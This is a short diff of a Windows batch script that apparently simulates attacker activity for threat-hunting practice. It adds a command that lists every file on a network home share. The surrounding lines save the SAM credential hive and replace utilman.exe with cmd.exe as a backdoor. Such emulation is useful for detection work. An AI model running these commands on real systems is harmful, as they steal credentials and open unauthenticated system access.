@@ -463,6 +463,8 @@ reg save HKLM\SAM sam.hive
 ECHO ============================
 ren cmd.exe utilman.exe
 ECHO ============================
+start /b cmd /c dir /b /s \\nas\users_home_share$ ^> shareinfo.txt
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
